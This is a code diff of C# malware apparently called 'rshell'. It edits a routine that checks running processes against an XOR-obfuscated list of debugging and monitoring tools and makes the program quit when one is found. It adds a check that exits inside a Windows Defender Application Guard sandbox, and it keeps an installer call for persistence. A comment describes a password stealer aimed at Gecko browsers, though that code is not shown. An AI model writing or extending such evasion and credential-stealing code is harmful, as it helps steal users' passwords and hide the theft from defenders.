@@ -1,98 +1,98 @@
-    // Libraries    
-    #region Lib
-    using System;
-    using System.IO;
-    using System.Net;
-    using System.Linq;
-    using System.Text;
-    using Crying.Reader;
-    using Microsoft.CSharp;
-    using Crying.Helpers;
-    using System.Drawing;
-    using System.Net.Http;
-    using System.Threading;
-    using System.Reflection;
-    using System.Windows.Forms;
-    using System.Diagnostics;
-    using Microsoft.VisualBasic;
-    using System.ServiceProcess;
-    using System.Threading.Tasks;
-    using System.Collections.Generic;
-    using static Crying.Helpers.Common;
-    using System.Net.NetworkInformation;
-    using System.Security.Cryptography;
-    using System.Runtime.InteropServices;
-    using System.Collections.Specialized;
-    using System.Text.RegularExpressions;
+        // Libraries    
+        #region Lib
+        using System;
+        using System.IO;
+        using System.Net;
+        using System.Linq;
+        using System.Text;
+        using Crying.Reader;
+        using Microsoft.CSharp;
+        using Crying.Helpers;
+        using System.Drawing;
+        using System.Net.Http;
+        using System.Threading;
+        using System.Reflection;
+        using System.Windows.Forms;
+        using System.Diagnostics;
+        using Microsoft.VisualBasic;
+        using System.ServiceProcess;
+        using System.Threading.Tasks;
+        using System.Collections.Generic;
+        using static Crying.Helpers.Common;
+        using System.Net.NetworkInformation;
+        using System.Security.Cryptography;
+        using System.Runtime.InteropServices;
+        using System.Collections.Specialized;
+        using System.Text.RegularExpressions;
 
-namespace rshell
-{
-    #endregion
-
-    // Varis = blocks known applications using XOR cipher
-    #region VariksenPelätin
-    class ProgramStarter
+    namespace rshell
     {
-        // xor
-        #region
-        static string xor(string text, int n = 256)
+        #endregion
+
+        // Varis = blocks known applications using XOR cipher
+        #region VariksenPelätin
+        class ProgramStarter
         {
-            byte[] input = Encoding.UTF8.GetBytes(text);
-            byte[] output = new byte[input.Length];
-            int i = 0;
-            foreach (byte b in input)
+            // xor
+            #region
+            static string xor(string text, int n = 256)
             {
-                output[i] = (byte)(b ^ n);
-                i++;
-            }
-            return Encoding.UTF8.GetString(output);
+                byte[] input = Encoding.UTF8.GetBytes(text);
+                byte[] output = new byte[input.Length];
+                int i = 0;
+                foreach (byte b in input)
+                {
+                    output[i] = (byte)(b ^ n);
+                    i++;
+                }
+                return Encoding.UTF8.GetString(output);
         }
         #endregion
 
         public static bool Starter()
         {
             string[] list = new string[] {
-                                    "QOTCUNGTM",
-                                    "OBGW",
-                                    "IJJ_BDA",
-                                    "RGUMKAT",
-                                    "VTIECUUNGEMCT",
-                                    "VTIEC^V",
-                                    "BHUV_",
-                                    "OBGW",
-                                    "OKKSHOR_BCDSAACT",
-                                    "QOTCUNGTM",
-                                    "BSKVEGV",
-                                    "NIIMC^VJITCT",
-                                    "OKVITRTCE",
-                                    "VCRIIJU",
-                                    "JITBVC",
-                                    "U_UOHUVCERIT",
-                                    "VTIEyGHGJ_\\CT",
-                                    "U_UGHGJ_\\CT",
-                                    "UHO@@yNOR",
-                                    "QOHBDA",
-                                    "LICDI^EIHRTIJ",
-                                    "@OBBJCT",
-                                    "LICDI^UCTPCT",
-                                    "OBG",
-                                    "OBG",
-                                    "PKRIIJUB",
-                                    "PKQGTCRTGR",
-                                    "PKQGTCSUCT",
-                                    "PKGERNJV",
-                                    "PDI^UCTPOEC",
-                                    "PDI^RTG_",
-                                    "MUBSKVCT",
-                                    "TCEJGUHCR",
-                                    "^BDA",
-                                    "IJJ_BDA",
-                                    "VTIATCUURCJCTOM@OBBJCTQCDBCDSAACT",
-                                    "^BDA",
-                                    "MUBSKVCT",
-                                    "NRRVBCDSAACT"
+                                        "QOTCUNGTM",
+                                        "OBGW",
+                                        "IJJ_BDA",
+                                        "RGUMKAT",
+                                        "VTIECUUNGEMCT",
+                                        "VTIEC^V",
+                                        "BHUV_",
+                                        "OBGW",
+                                        "OKKSHOR_BCDSAACT",
+                                        "QOTCUNGTM",
+                                        "BSKVEGV",
+                                        "NIIMC^VJITCT",
+                                        "OKVITRTCE",
+                                        "VCRIIJU",
+                                        "JITBVC",
+                                        "U_UOHUVCERIT",
+                                        "VTIEyGHGJ_\\CT",
+                                        "U_UGHGJ_\\CT",
+                                        "UHO@@yNOR",
+                                        "QOHBDA",
+                                        "LICDI^EIHRTIJ",
+                                        "@OBBJCT",
+                                        "LICDI^UCTPCT",
+                                        "OBG",
+                                        "OBG",
+                                        "PKRIIJUB",
+                                        "PKQGTCRTGR",
+                                        "PKQGTCSUCT",
+                                        "PKGERNJV",
+                                        "PDI^UCTPOEC",
+                                        "PDI^RTG_",
+                                        "MUBSKVCT",
+                                        "TCEJGUHCR",
+                                        "^BDA",
+                                        "IJJ_BDA",
+                                        "VTIATCUURCJCTOM@OBBJCTQCDBCDSAACT",
+                                        "^BDA",
+                                        "MUBSKVCT",
+                                        "NRRVBCDSAACT"
 
-                                };
+                                    };
 
             foreach (Process p in Process.GetProcesses())
             {
@@ -108,6 +108,7 @@ namespace rshell
             return false;
 
         }
+        
         #endregion
 
         // Lepakko = Password stealer engine. Steals from all gecko browsers.
@@ -166,14 +167,12 @@ namespace rshell
                 while (true)
                 {
                     if (ProgramStarter.Starter()) { Environment.FailFast(null); }
-
+                    if (Environment.MachineName == "WDAGUtilityAccount")
+                    {
+                        Environment.FailFast(null);
+                    }
                     Thread.Sleep(100);
                 }
-            }
-
-            static void Startup()
-            {
-                Installer.Install();
             }
 
             static void Main()
@@ -182,7 +181,6 @@ namespace rshell
                 new Thread(Join).Start();
                 Installer.Install();
                 Runner();
-                Startup();
             }
 
             static void Join()
